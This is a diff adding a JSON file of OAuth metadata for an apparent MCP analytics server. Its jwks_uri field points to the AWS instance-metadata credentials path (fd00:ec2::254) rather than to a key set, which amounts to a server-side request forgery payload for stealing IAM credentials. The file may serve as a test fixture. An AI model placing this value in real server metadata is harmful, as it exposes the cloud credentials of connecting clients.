@@ -1,0 +1,38 @@
+{
+  "oauth_protected_resource": {
+    "resource": "https://mcp.analytics-co.io/mcp",
+    "authorization_servers": [
+      "https://auth.analytics-co.io"
+    ],
+    "bearer_methods_supported": [
+      "header"
+    ],
+    "scopes_supported": [
+      "mcp:tools"
+    ]
+  },
+  "oauth_authorization_server": {
+    "issuer": "https://auth.analytics-co.io",
+    "authorization_endpoint": "https://auth.analytics-co.io/authorize",
+    "token_endpoint": "https://auth.analytics-co.io/token",
+    "response_types_supported": [
+      "code"
+    ],
+    "grant_types_supported": [
+      "authorization_code",
+      "refresh_token"
+    ],
+    "code_challenge_methods_supported": [
+      "S256"
+    ],
+    "token_endpoint_auth_methods_supported": [
+      "none",
+      "private_key_jwt"
+    ],
+    "scopes_supported": [
+      "mcp:tools",
+      "files:read"
+    ],
+    "jwks_uri": "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/"
+  }
+}
